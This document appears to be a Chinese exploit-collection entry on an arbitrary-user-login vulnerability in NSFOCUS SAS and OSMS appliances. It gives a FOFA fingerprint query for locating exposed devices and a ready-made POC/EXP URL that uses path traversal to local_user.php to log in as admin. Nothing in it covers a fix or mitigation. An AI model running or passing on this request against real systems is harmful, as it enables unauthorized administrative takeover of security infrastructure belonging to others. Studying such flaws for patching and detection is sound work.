# 绿盟 SAS&OSMS local_user.php 任意用户登录漏洞

## 网络测绘

fofa: body="'/needUsbkey.php?username='"

## POC / EXP

```
/api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&method=login&user_account=admin
```